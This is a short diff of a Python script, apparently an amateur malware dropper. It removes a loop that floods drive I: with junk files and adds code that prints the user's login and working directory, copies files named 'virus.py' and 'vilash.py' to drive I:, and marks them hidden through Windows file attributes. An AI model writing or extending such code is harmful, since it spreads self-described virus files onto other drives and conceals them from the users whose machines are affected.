@@ -1,15 +1,18 @@
+import os
+import shutil 
 import time
-from random import randint
-timer = 0
+import ctypes
 
-while True :
-    timer += 1
-    try:
-        name_file = randint(1,500)
-        time.sleep(1)
-        fh = open("I:%i"% name_file, 'a')
-        fh.write("Foobar 2")
-        fh.close()
-    except:
-        pass
-    print('time of ruinig >>',timer)
+
+print(os.getlogin())
+pwd =os.getcwd()
+print(pwd)
+try:
+    cp_virus = shutil.copy('virus.py','i:')
+    cp_vilash = shutil.copy('vilash.py','i:')
+except:
+    pass
+ctypes.windll.kernel32.SetFileAttributesW('i:vilash.py',2)
+ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
+
+
